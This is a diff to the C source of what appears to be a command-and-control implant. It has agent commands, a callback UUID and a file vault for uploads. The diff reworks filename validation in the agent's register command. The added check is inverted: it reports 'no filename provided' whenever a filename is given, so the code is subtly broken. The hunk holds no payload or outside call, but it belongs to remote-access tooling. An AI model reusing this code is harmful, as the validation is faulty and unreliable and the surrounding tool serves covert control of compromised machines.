@@ -111,15 +111,17 @@ void agent_whoami(AgentState *state, TaskInfo *task) {
 }
 
 void agent_register(AgentState *state, TaskInfo *task) {
+	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters)) {
+		agent_post(state, task, "no filename provided", "error: no filename provided");
+		return;
+	}
+
 	char *name = MSVCRT$strtok(task->parameters, "\t");
 	char *uuid = MSVCRT$strtok(NULL, "\t");
 	
-	if (MSVCRT$strlen(name) == 0) {
-		agent_post(state, task, "no filename provided", "error: no filename provided");
-	}
-	
 	if (is_in_vault(&state->file_vault, name) == TRUE) {
 		agent_post(state, task, "duplicate filename", "error: duplicate filename");
+		return;
 	}
 
 	UploadManager upload = initialise_upload_manager(state->params.callback_uuid, task->id, uuid);
